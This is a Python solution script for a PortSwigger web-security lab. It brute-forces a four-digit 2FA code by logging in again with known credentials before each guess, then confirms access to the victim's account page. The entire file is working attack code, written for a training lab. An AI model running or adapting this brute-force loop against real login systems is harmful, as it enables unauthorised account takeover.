# Lab 14 — 2FA bypass using a brute-force attack
# PortSwigger: https://portswigger.net/web-security/authentication/multi-factor/lab-2fa-bypass-using-a-brute-force-attack
#
# Vulnerability: The 2FA endpoint has no rate limiting on the CODE itself, but
#                submitting a WRONG code invalidates the session — forcing a
#                fresh login before every single guess
# Aim:           Brute-force the 4-digit 2FA code for carlos:montoya
#
# Technique:
#   Unlike Lab 08 (code tied to a manipulable cookie), here the ONLY way to
#   get a fresh attempt is a full re-login. This script performs that full
#   cycle before every guess:
#     1. GET /login  → csrf token
#     2. POST /login  carlos:montoya → session issued, redirected to /login2
#     3. GET /login2 → confirm we're on the 2FA prompt
#     4. POST /login2  mfa-code=<candidate> → 302 means success
#
#   This is the "Burp macro" pattern from the notes, translated directly into
#   Python — each guess gets its own completely fresh authenticated session.
#
# Usage: python authentication_lab14.py <url>

import sys
import urllib3
from proxies import proxies
from authentication_utils import banner, section, make_session, get_csrf_from_response, check_status, print_box

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

CARLOS_USERNAME = "carlos"
CARLOS_PASSWORD = "montoya"


def fresh_login_to_2fa(session, url):
    """
    Perform a full login (step 1) to reach the 2FA prompt with a fresh session.
    Returns True if step 1 succeeded and we're now at /login2.
    """
    login_page = session.get(f"{url}/login")
    csrf = get_csrf_from_response(login_page.text)

    data = {"username": CARLOS_USERNAME, "password": CARLOS_PASSWORD}
    if csrf:
        data["csrf"] = csrf

    r = session.post(f"{url}/login", data=data, allow_redirects=True)
    return "login2" in r.url or "security code" in r.text.lower()


def try_2fa_code(session, url, code):
    """Submit a single 2FA code guess against the current fresh session."""
    login2_page = session.get(f"{url}/login2")
    csrf = get_csrf_from_response(login2_page.text)

    data = {"mfa-code": code}
    if csrf:
        data["csrf"] = csrf

    return session.post(f"{url}/login2", data=data, allow_redirects=False)


def brute_force_2fa_with_relogin(url, proxies_config):
    print(f"  ➜  Brute-forcing 4-digit 2FA code (0000–9999)")
    print(f"  ℹ  Each guess requires a fresh session (full re-login) —")
    print(f"     this will take a while. Progress printed every 25 attempts.\n")

    for code_int in range(10000):
        code = f"{code_int:04d}"

        # Fresh session per attempt — mirrors what a Burp macro automates
        session = make_session(proxies_config)

        if not fresh_login_to_2fa(session, url):
            print(f"  ✘  Step 1 login failed at code {code} — check credentials")
            return None, None

        r = try_2fa_code(session, url, code)

        if r.status_code == 302:
            print(f"\n  ✔  Valid 2FA code found: {code}")
            return code, session

        if code_int % 25 == 0:
            print(f"  ·  {code_int}/9999 tried (current: {code})...")

    return None, None


if __name__ == "__main__":
    banner()
    section("LAB 14 — 2FA BYPASS USING A BRUTE-FORCE ATTACK (RE-LOGIN PER GUESS)")

    if len(sys.argv) != 2:
        print("  Usage: python authentication_lab14.py <url>")
        sys.exit(1)

    url = sys.argv[1]

    print("\n  ℹ  This lab requires a FULL re-login before every single code guess")
    print("     (submitting a wrong code invalidates the session). This script")
    print("     performs that complete cycle in a loop — no macro tooling needed")
    print("     since we're driving the whole thing with `requests` directly.\n")

    valid_code, final_session = brute_force_2fa_with_relogin(url, proxies)

    if not valid_code:
        print("  ✘  2FA code not found in 0000–9999 range")
        sys.exit(1)

    # ── Confirm access with the session that succeeded ────────────────────────
    print("\n  ── Confirming access to /my-account\n")
    r = final_session.get(f"{url}/my-account", allow_redirects=True)
    check_status(r, 200, "GET /my-account as carlos")

    print_box("SUCCESS", f"carlos's 2FA code: {valid_code}")
    print()
    print("  ℹ  In Burp, this exact flow is automated with a Session Handling")
    print("     Rule → 'Run a macro' recording steps 1–3, attached to the")
    print("     Intruder attack on POST /login2. This script achieves the same")
    print("     result directly in Python without needing Burp Pro's speed.")
